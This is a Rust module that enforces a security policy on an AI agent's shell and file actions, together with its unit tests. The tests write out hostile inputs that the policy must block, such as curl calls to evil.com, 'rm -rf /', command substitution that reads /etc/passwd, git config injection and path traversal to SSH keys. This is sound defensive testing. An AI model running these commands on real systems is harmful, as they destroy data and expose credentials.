mod command;
mod path;
mod tenant;
mod trackers;
mod types;

#[allow(unused_imports)]
pub use tenant::{
    TENANT_DEFAULT_SCOPE_FALLBACK_DENIED_ERROR, TENANT_RECALL_CROSS_SCOPE_DENIED_ERROR,
    TenantPolicyContext,
};
pub use trackers::{ActionTracker, CostTracker};
pub use types::{ActionPolicyVerdict, AutonomyLevel, ExternalActionExecution};

use std::path::{Path, PathBuf};

const ACTION_LIMIT_EXCEEDED_ERROR: &str = "blocked by security policy: action limit exceeded";
const COST_LIMIT_EXCEEDED_ERROR: &str = "blocked by security policy: daily cost limit exceeded";

/// Security policy enforced on all tool executions
#[derive(Debug, Clone)]
pub struct SecurityPolicy {
    pub autonomy: AutonomyLevel,
    pub external_action_execution: ExternalActionExecution,
    pub workspace_dir: PathBuf,
    pub workspace_only: bool,
    pub allowed_commands: Vec<String>,
    pub forbidden_paths: Vec<String>,
    pub max_actions_per_hour: u32,
    pub max_cost_per_day_cents: u32,
    pub tracker: ActionTracker,
    pub cost_tracker: CostTracker,
}

impl Default for SecurityPolicy {
    fn default() -> Self {
        Self {
            autonomy: AutonomyLevel::Supervised,
            external_action_execution: ExternalActionExecution::Disabled,
            workspace_dir: PathBuf::from("."),
            workspace_only: true,
            allowed_commands: vec![
                "git".into(),
                "npm".into(),
                "cargo".into(),
                "ls".into(),
                "cat".into(),
                "grep".into(),
                "find".into(),
                "echo".into(),
                "pwd".into(),
                "wc".into(),
                "head".into(),
                "tail".into(),
            ],
            forbidden_paths: vec![
                // System directories (blocked even when workspace_only=false)
                "/etc".into(),
                "/root".into(),
                "/home".into(),
                "/usr".into(),
                "/bin".into(),
                "/sbin".into(),
                "/lib".into(),
                "/opt".into(),
                "/boot".into(),
                "/dev".into(),
                "/proc".into(),
                "/sys".into(),
                "/var".into(),
                "/tmp".into(),
                // Sensitive dotfiles
                "~/.ssh".into(),
                "~/.gnupg".into(),
                "~/.aws".into(),
                "~/.config".into(),
            ],
            max_actions_per_hour: 20,
            max_cost_per_day_cents: 500,
            tracker: ActionTracker::new(),
            cost_tracker: CostTracker::new(),
        }
    }
}

impl SecurityPolicy {
    /// Check if autonomy level permits any action at all
    pub fn can_act(&self) -> bool {
        self.autonomy != AutonomyLevel::ReadOnly
    }

    /// Record an action and check if the rate limit has been exceeded.
    /// Returns `true` if the action is allowed, `false` if rate-limited.
    pub fn record_action(&self) -> bool {
        let count = self.tracker.record();
        count <= self.max_actions_per_hour as usize
    }

    /// Check if the rate limit would be exceeded without recording.
    pub fn is_rate_limited(&self) -> bool {
        self.tracker.count() >= self.max_actions_per_hour as usize
    }

    pub fn consume_action_and_cost(&self, estimated_cost_cents: u32) -> Result<(), &'static str> {
        if !self.record_action() {
            return Err(ACTION_LIMIT_EXCEEDED_ERROR);
        }

        if !self
            .cost_tracker
            .record(estimated_cost_cents, self.max_cost_per_day_cents)
        {
            return Err(COST_LIMIT_EXCEEDED_ERROR);
        }

        Ok(())
    }

    /// Build from config sections
    pub fn from_config(
        autonomy_config: &crate::config::AutonomyConfig,
        workspace_dir: &Path,
    ) -> Self {
        Self {
            autonomy: autonomy_config.level,
            external_action_execution: autonomy_config.external_action_execution,
            workspace_dir: workspace_dir.to_path_buf(),
            workspace_only: autonomy_config.workspace_only,
            allowed_commands: autonomy_config.allowed_commands.clone(),
            forbidden_paths: autonomy_config.forbidden_paths.clone(),
            max_actions_per_hour: autonomy_config.max_actions_per_hour,
            max_cost_per_day_cents: autonomy_config.max_cost_per_day_cents,
            tracker: ActionTracker::new(),
            cost_tracker: CostTracker::new(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_policy() -> SecurityPolicy {
        SecurityPolicy::default()
    }

    fn readonly_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            ..SecurityPolicy::default()
        }
    }

    fn full_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            ..SecurityPolicy::default()
        }
    }

    // ── AutonomyLevel ────────────────────────────────────────

    #[test]
    fn autonomy_default_is_supervised() {
        assert_eq!(AutonomyLevel::default(), AutonomyLevel::Supervised);
    }

    #[test]
    fn autonomy_serde_roundtrip() {
        let json = serde_json::to_string(&AutonomyLevel::Full).unwrap();
        assert_eq!(json, "\"full\"");
        let parsed: AutonomyLevel = serde_json::from_str("\"readonly\"").unwrap();
        assert_eq!(parsed, AutonomyLevel::ReadOnly);
        let parsed2: AutonomyLevel = serde_json::from_str("\"supervised\"").unwrap();
        assert_eq!(parsed2, AutonomyLevel::Supervised);
    }

    #[test]
    fn can_act_readonly_false() {
        assert!(!readonly_policy().can_act());
    }

    #[test]
    fn can_act_supervised_true() {
        assert!(default_policy().can_act());
    }

    #[test]
    fn can_act_full_true() {
        assert!(full_policy().can_act());
    }

    // ── is_command_allowed ───────────────────────────────────

    #[test]
    fn allowed_commands_basic() {
        let p = default_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("cargo build --release"));
        assert!(p.is_command_allowed("cat file.txt"));
        assert!(p.is_command_allowed("grep -r pattern ."));
    }

    #[test]
    fn blocked_commands_basic() {
        let p = default_policy();
        assert!(!p.is_command_allowed("rm -rf /"));
        assert!(!p.is_command_allowed("sudo apt install"));
        assert!(!p.is_command_allowed("curl http://evil.com"));
        assert!(!p.is_command_allowed("wget http://evil.com"));
        assert!(!p.is_command_allowed("python3 exploit.py"));
        assert!(!p.is_command_allowed("node malicious.js"));
    }

    #[test]
    fn readonly_blocks_all_commands() {
        let p = readonly_policy();
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("cat file.txt"));
        assert!(!p.is_command_allowed("echo hello"));
    }

    #[test]
    fn full_autonomy_still_uses_allowlist() {
        let p = full_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("rm -rf /"));
    }

    #[test]
    fn command_with_absolute_path_extracts_basename() {
        let p = default_policy();
        assert!(p.is_command_allowed("/usr/bin/git status"));
        assert!(p.is_command_allowed("/bin/ls -la"));
    }

    #[test]
    fn empty_command_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed(""));
        assert!(!p.is_command_allowed("   "));
    }

    #[test]
    fn command_with_pipes_validates_all_segments() {
        let p = default_policy();
        // Both sides of the pipe are in the allowlist
        assert!(p.is_command_allowed("ls | grep foo"));
        assert!(p.is_command_allowed("cat file.txt | wc -l"));
        // Second command not in allowlist — blocked
        assert!(!p.is_command_allowed("ls | curl http://evil.com"));
        assert!(!p.is_command_allowed("echo hello | python3 -"));
    }

    #[test]
    fn custom_allowlist() {
        let p = SecurityPolicy {
            allowed_commands: vec!["docker".into(), "kubectl".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("docker ps"));
        assert!(p.is_command_allowed("kubectl get pods"));
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("git status"));
    }

    #[test]
    fn empty_allowlist_blocks_everything() {
        let p = SecurityPolicy {
            allowed_commands: vec![],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("echo hello"));
    }

    // ── is_path_allowed ─────────────────────────────────────

    #[test]
    fn relative_paths_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed("file.txt"));
        assert!(p.is_path_allowed("src/main.rs"));
        assert!(p.is_path_allowed("deep/nested/dir/file.txt"));
    }

    #[test]
    fn path_traversal_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("../etc/passwd"));
        assert!(!p.is_path_allowed("../../root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("foo/../../../etc/shadow"));
        assert!(!p.is_path_allowed(".."));
    }

    #[test]
    fn absolute_paths_blocked_when_workspace_only() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/etc/passwd"));
        assert!(!p.is_path_allowed("/root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("/tmp/file.txt"));
    }

    #[test]
    fn absolute_paths_allowed_when_not_workspace_only() {
        let p = SecurityPolicy {
            workspace_only: false,
            forbidden_paths: vec![],
            ..SecurityPolicy::default()
        };
        assert!(p.is_path_allowed("/tmp/file.txt"));
    }

    #[test]
    fn forbidden_paths_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/etc/passwd"));
        assert!(!p.is_path_allowed("/root/.bashrc"));
        assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~/.gnupg/pubring.kbx"));
    }

    #[test]
    fn empty_path_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed(""));
    }

    #[test]
    fn dotfile_in_workspace_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed(".gitignore"));
        assert!(p.is_path_allowed(".env"));
    }

    // ── from_config ─────────────────────────────────────────

    #[test]
    fn from_config_maps_all_fields() {
        let autonomy_config = crate::config::AutonomyConfig {
            level: AutonomyLevel::Full,
            external_action_execution: ExternalActionExecution::Enabled,
            workspace_only: false,
            allowed_commands: vec!["docker".into()],
            forbidden_paths: vec!["/secret".into()],
            max_actions_per_hour: 100,
            max_cost_per_day_cents: 1000,
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test-workspace");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        assert_eq!(policy.autonomy, AutonomyLevel::Full);
        assert_eq!(
            policy.external_action_execution,
            ExternalActionExecution::Enabled
        );
        assert!(!policy.workspace_only);
        assert_eq!(policy.allowed_commands, vec!["docker"]);
        assert_eq!(policy.forbidden_paths, vec!["/secret"]);
        assert_eq!(policy.max_actions_per_hour, 100);
        assert_eq!(policy.max_cost_per_day_cents, 1000);
        assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
    }

    // ── Default policy ──────────────────────────────────────

    #[test]
    fn default_policy_has_sane_values() {
        let p = SecurityPolicy::default();
        assert_eq!(p.autonomy, AutonomyLevel::Supervised);
        assert_eq!(
            p.external_action_execution,
            ExternalActionExecution::Disabled
        );
        assert!(p.workspace_only);
        assert!(!p.allowed_commands.is_empty());
        assert!(!p.forbidden_paths.is_empty());
        assert!(p.max_actions_per_hour > 0);
        assert!(p.max_cost_per_day_cents > 0);
    }

    // ── ActionTracker / rate limiting ───────────────────────

    #[test]
    fn action_tracker_starts_at_zero() {
        let tracker = ActionTracker::new();
        assert_eq!(tracker.count(), 0);
    }

    #[test]
    fn action_tracker_records_actions() {
        let tracker = ActionTracker::new();
        assert_eq!(tracker.record(), 1);
        assert_eq!(tracker.record(), 2);
        assert_eq!(tracker.record(), 3);
        assert_eq!(tracker.count(), 3);
    }

    #[test]
    fn record_action_allows_within_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 5,
            ..SecurityPolicy::default()
        };
        for _ in 0..5 {
            assert!(p.record_action(), "should allow actions within limit");
        }
    }

    #[test]
    fn record_action_blocks_over_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 3,
            ..SecurityPolicy::default()
        };
        assert!(p.record_action()); // 1
        assert!(p.record_action()); // 2
        assert!(p.record_action()); // 3
        assert!(!p.record_action()); // 4 — over limit
    }

    #[test]
    fn is_rate_limited_reflects_count() {
        let p = SecurityPolicy {
            max_actions_per_hour: 2,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_rate_limited());
        p.record_action();
        assert!(!p.is_rate_limited());
        p.record_action();
        assert!(p.is_rate_limited());
    }

    #[test]
    fn action_tracker_clone_is_independent() {
        let tracker = ActionTracker::new();
        tracker.record();
        tracker.record();
        let cloned = tracker.clone();
        assert_eq!(cloned.count(), 2);
        tracker.record();
        assert_eq!(tracker.count(), 3);
        assert_eq!(cloned.count(), 2); // clone is independent
    }

    // ── Edge cases: command injection ────────────────────────

    #[test]
    fn command_injection_semicolon_blocked() {
        let p = default_policy();
        // First word is "ls;" (with semicolon) — doesn't match "ls" in allowlist.
        // This is a safe default: chained commands are blocked.
        assert!(!p.is_command_allowed("ls; rm -rf /"));
    }

    #[test]
    fn command_injection_semicolon_no_space() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls;rm -rf /"));
    }

    #[test]
    fn command_injection_backtick_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo `whoami`"));
        assert!(!p.is_command_allowed("echo `rm -rf /`"));
    }

    #[test]
    fn command_injection_dollar_paren_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
        assert!(!p.is_command_allowed("echo $(rm -rf /)"));
    }

    #[test]
    fn command_with_env_var_prefix() {
        let p = default_policy();
        // "FOO=bar" is the first word — not in allowlist
        assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
    }

    #[test]
    fn command_newline_injection_blocked() {
        let p = default_policy();
        // Newline splits into two commands; "rm" is not in allowlist
        assert!(!p.is_command_allowed("ls\nrm -rf /"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls\necho hello"));
    }

    #[test]
    fn command_injection_and_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls && rm -rf /"));
        assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls && echo done"));
    }

    #[test]
    fn command_injection_or_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls || rm -rf /"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls || echo fallback"));
    }

    #[test]
    fn command_injection_redirect_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
        assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
    }

    #[test]
    fn command_injection_dollar_brace_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo ${IFS}cat${IFS}/etc/passwd"));
    }

    #[test]
    fn command_env_var_prefix_with_allowed_cmd() {
        let p = default_policy();
        // env assignment + allowed command — OK
        assert!(p.is_command_allowed("FOO=bar ls"));
        assert!(p.is_command_allowed("LANG=C grep pattern file"));
        // env assignment + disallowed command — blocked
        assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
    }

    // ── Edge cases: path traversal ──────────────────────────

    #[test]
    fn path_traversal_encoded_dots() {
        let p = default_policy();
        // Literal ".." in path — always blocked
        assert!(!p.is_path_allowed("foo/..%2f..%2fetc/passwd"));
    }

    #[test]
    fn path_traversal_double_dot_in_filename() {
        let p = default_policy();
        // ".." in a filename (not a path component) is allowed
        assert!(p.is_path_allowed("my..file.txt"));
        // But actual traversal components are still blocked
        assert!(!p.is_path_allowed("../etc/passwd"));
        assert!(!p.is_path_allowed("foo/../etc/passwd"));
    }

    #[test]
    fn path_with_null_byte_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("file\0.txt"));
    }

    #[test]
    fn path_symlink_style_absolute() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/proc/self/root/etc/passwd"));
    }

    #[test]
    fn path_home_tilde_ssh() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~/.gnupg/secring.gpg"));
    }

    #[test]
    fn path_var_run_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/var/run/docker.sock"));
    }

    // ── Edge cases: rate limiter boundary ────────────────────

    #[test]
    fn rate_limit_exactly_at_boundary() {
        let p = SecurityPolicy {
            max_actions_per_hour: 1,
            ..SecurityPolicy::default()
        };
        assert!(p.record_action()); // 1 — exactly at limit
        assert!(!p.record_action()); // 2 — over
        assert!(!p.record_action()); // 3 — still over
    }

    #[test]
    fn rate_limit_zero_blocks_everything() {
        let p = SecurityPolicy {
            max_actions_per_hour: 0,
            ..SecurityPolicy::default()
        };
        assert!(!p.record_action());
    }

    #[test]
    fn rate_limit_high_allows_many() {
        let p = SecurityPolicy {
            max_actions_per_hour: 10000,
            ..SecurityPolicy::default()
        };
        for _ in 0..100 {
            assert!(p.record_action());
        }
    }

    // ── Edge cases: autonomy + command combos ────────────────

    #[test]
    fn readonly_blocks_even_safe_commands() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            allowed_commands: vec!["ls".into(), "cat".into()],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("cat"));
        assert!(!p.can_act());
    }

    #[test]
    fn supervised_allows_listed_commands() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            allowed_commands: vec!["git".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("git status"));
        assert!(!p.is_command_allowed("docker ps"));
    }

    #[test]
    fn full_autonomy_still_respects_forbidden_paths() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/etc/shadow"));
        assert!(!p.is_path_allowed("/root/.bashrc"));
    }

    // ── Edge cases: from_config preserves tracker ────────────

    #[test]
    fn from_config_creates_fresh_tracker() {
        let autonomy_config = crate::config::AutonomyConfig {
            level: AutonomyLevel::Full,
            external_action_execution: ExternalActionExecution::Disabled,
            workspace_only: false,
            allowed_commands: vec![],
            forbidden_paths: vec![],
            max_actions_per_hour: 10,
            max_cost_per_day_cents: 100,
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);
        assert_eq!(policy.tracker.count(), 0);
        assert!(!policy.is_rate_limited());
        assert_eq!(policy.cost_tracker.spent_today(), 0);
    }

    #[test]
    fn consume_action_and_cost_denies_over_action_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 0,
            ..SecurityPolicy::default()
        };

        let err = p.consume_action_and_cost(0).unwrap_err();
        assert_eq!(err, ACTION_LIMIT_EXCEEDED_ERROR);
    }

    #[test]
    fn consume_action_and_cost_denies_over_daily_cost_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 10,
            max_cost_per_day_cents: 5,
            ..SecurityPolicy::default()
        };

        assert!(p.consume_action_and_cost(5).is_ok());
        let err = p.consume_action_and_cost(1).unwrap_err();
        assert_eq!(err, COST_LIMIT_EXCEEDED_ERROR);
    }

    #[test]
    fn tenant_policy_context_allows_same_tenant_recall_scope() {
        let context = TenantPolicyContext::enabled("tenant-alpha");
        assert!(
            context
                .enforce_recall_scope("tenant-alpha:user-123")
                .is_ok()
        );
        assert!(context.enforce_recall_scope("tenant-alpha/session").is_ok());
    }

    #[test]
    fn tenant_policy_context_denies_cross_tenant_recall_scope() {
        let context = TenantPolicyContext::enabled("tenant-alpha");
        let err = context
            .enforce_recall_scope("tenant-beta:user-123")
            .unwrap_err();
        assert_eq!(err, TENANT_RECALL_CROSS_SCOPE_DENIED_ERROR);
    }

    #[test]
    fn tenant_policy_context_denies_default_scope_fallback_when_enabled() {
        let context = TenantPolicyContext::enabled("tenant-alpha");
        let err = context.enforce_recall_scope("default").unwrap_err();
        assert_eq!(err, TENANT_DEFAULT_SCOPE_FALLBACK_DENIED_ERROR);
    }

    // ══════════════════════════════════════════════════════════
    // SECURITY CHECKLIST TESTS
    // Checklist: gateway not public, pairing required,
    //            filesystem scoped (no /), access via tunnel
    // ══════════════════════════════════════════════════════════

    // ── Checklist #3: Filesystem scoped (no /) ──────────────

    #[test]
    fn checklist_root_path_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/"));
        assert!(!p.is_path_allowed("/anything"));
    }

    #[test]
    fn checklist_all_system_dirs_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        for dir in [
            "/etc", "/root", "/home", "/usr", "/bin", "/sbin", "/lib", "/opt", "/boot", "/dev",
            "/proc", "/sys", "/var", "/tmp",
        ] {
            assert!(
                !p.is_path_allowed(dir),
                "System dir should be blocked: {dir}"
            );
            assert!(
                !p.is_path_allowed(&format!("{dir}/subpath")),
                "Subpath of system dir should be blocked: {dir}/subpath"
            );
        }
    }

    #[test]
    fn checklist_sensitive_dotfiles_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        for path in [
            "~/.ssh/id_rsa",
            "~/.gnupg/secring.gpg",
            "~/.aws/credentials",
            "~/.config/secrets",
        ] {
            assert!(
                !p.is_path_allowed(path),
                "Sensitive dotfile should be blocked: {path}"
            );
        }
    }

    #[test]
    fn checklist_null_byte_injection_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("safe\0/../../../etc/passwd"));
        assert!(!p.is_path_allowed("\0"));
        assert!(!p.is_path_allowed("file\0"));
    }

    #[test]
    fn checklist_workspace_only_blocks_all_absolute() {
        let p = SecurityPolicy {
            workspace_only: true,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/any/absolute/path"));
        assert!(p.is_path_allowed("relative/path.txt"));
    }

    #[test]
    fn checklist_resolved_path_must_be_in_workspace() {
        let p = SecurityPolicy {
            workspace_dir: PathBuf::from("/home/user/project"),
            ..SecurityPolicy::default()
        };
        // Inside workspace — allowed
        assert!(p.is_resolved_path_allowed(Path::new("/home/user/project/src/main.rs")));
        // Outside workspace — blocked (symlink escape)
        assert!(!p.is_resolved_path_allowed(Path::new("/etc/passwd")));
        assert!(!p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
        // Root — blocked
        assert!(!p.is_resolved_path_allowed(Path::new("/")));
    }

    #[test]
    fn checklist_default_policy_is_workspace_only() {
        let p = SecurityPolicy::default();
        assert!(
            p.workspace_only,
            "Default policy must be workspace_only=true"
        );
    }

    #[test]
    fn checklist_default_forbidden_paths_comprehensive() {
        let p = SecurityPolicy::default();
        for dir in ["/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp"] {
            assert!(
                p.forbidden_paths.iter().any(|f| f == dir),
                "Default forbidden_paths must include {dir}"
            );
        }
        for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
            assert!(
                p.forbidden_paths.iter().any(|f| f == dot),
                "Default forbidden_paths must include {dot}"
            );
        }
    }

    // ── Blocked arguments/subcommands (C-3 security hardening) ──

    #[test]
    fn git_push_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git push"));
        assert!(!p.is_command_allowed("git push origin main"));
    }

    #[test]
    fn git_remote_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git remote add evil https://evil.com/repo.git"));
        assert!(!p.is_command_allowed("git remote set-url origin https://evil.com"));
    }

    #[test]
    fn git_config_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git config user.email hacker@evil.com"));
        assert!(!p.is_command_allowed("git config --global core.editor malicious"));
    }

    #[test]
    fn git_config_injection_via_clone_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed(
            "git clone --config core.sshCommand='curl http://evil.com' https://repo.git"
        ));
        assert!(!p.is_command_allowed("git -c core.pager=malicious log"));
    }

    #[test]
    fn git_submodule_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git submodule add https://evil.com/repo.git"));
    }

    #[test]
    fn git_safe_read_commands_still_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("git log --oneline -10"));
        assert!(p.is_command_allowed("git diff HEAD~1"));
        assert!(p.is_command_allowed("git branch -a"));
        assert!(p.is_command_allowed("git show HEAD"));
        assert!(p.is_command_allowed("git blame src/main.rs"));
        assert!(p.is_command_allowed("git stash list"));
    }

    #[test]
    fn git_clone_and_fetch_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("git clone https://github.com/user/repo.git"));
        assert!(p.is_command_allowed("git fetch origin"));
        assert!(p.is_command_allowed("git pull --ff-only"));
    }

    #[test]
    fn find_exec_disallowed_command_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("find . -exec rm -rf {} \\;"));
        assert!(!p.is_command_allowed("find . -exec python3 exploit.py {} \\;"));
        assert!(!p.is_command_allowed("find . -execdir curl http://evil.com {} \\;"));
        assert!(!p.is_command_allowed("find . -delete"));
    }

    #[test]
    fn find_exec_allowed_command_passes() {
        let p = default_policy();
        assert!(p.is_command_allowed("find . -exec grep TODO {} \\;"));
        assert!(p.is_command_allowed("find . -execdir cat {} \\;"));
        assert!(p.is_command_allowed("find . -name '*.rs' -exec wc -l {} \\;"));
    }

    #[test]
    fn find_safe_usage_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("find . -name '*.rs'"));
        assert!(p.is_command_allowed("find . -type f -name '*.toml'"));
    }

    #[test]
    fn npm_publish_blocked() {
        let p = SecurityPolicy {
            allowed_commands: vec!["npm".into()],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("npm publish"));
        assert!(!p.is_command_allowed("npm login"));
        assert!(!p.is_command_allowed("npm token create"));
    }

    #[test]
    fn npm_safe_commands_allowed() {
        let p = SecurityPolicy {
            allowed_commands: vec!["npm".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("npm install"));
        assert!(p.is_command_allowed("npm run build"));
        assert!(p.is_command_allowed("npm test"));
    }

    #[test]
    fn cargo_publish_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("cargo publish"));
        assert!(!p.is_command_allowed("cargo login"));
    }

    #[test]
    fn cargo_safe_commands_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("cargo build --release"));
        assert!(p.is_command_allowed("cargo test"));
        assert!(p.is_command_allowed("cargo clippy -- -D warnings"));
        assert!(p.is_command_allowed("cargo fmt -- --check"));
    }

    #[test]
    fn git_upload_pack_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git fetch --upload-pack=evil"));
    }

    #[test]
    fn git_credential_subcommand_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git credential fill"));
        assert!(!p.is_command_allowed("git credential approve"));
    }

    #[test]
    fn git_remote_read_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("git remote -v"));
        assert!(p.is_command_allowed("git remote show origin"));
        assert!(p.is_command_allowed("git remote get-url origin"));
    }

    #[test]
    fn git_config_read_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("git config user.name"));
        assert!(p.is_command_allowed("git config user.email"));
        assert!(p.is_command_allowed("git config --list"));
    }

    #[test]
    fn git_submodule_update_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("git submodule update --init --recursive"));
        assert!(p.is_command_allowed("git submodule status"));
        assert!(p.is_command_allowed("git submodule foreach git pull"));
    }

    #[test]
    fn no_false_positive_on_filenames() {
        let p = default_policy();
        assert!(p.is_command_allowed("cat credential.json"));
        assert!(p.is_command_allowed("grep filter.rs src/"));
        assert!(p.is_command_allowed("cat remote.origin.url"));
    }

    #[test]
    fn no_false_positive_on_global_flag_in_non_git() {
        let p = SecurityPolicy {
            allowed_commands: vec!["npm".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("npm install --global typescript"));
    }
}
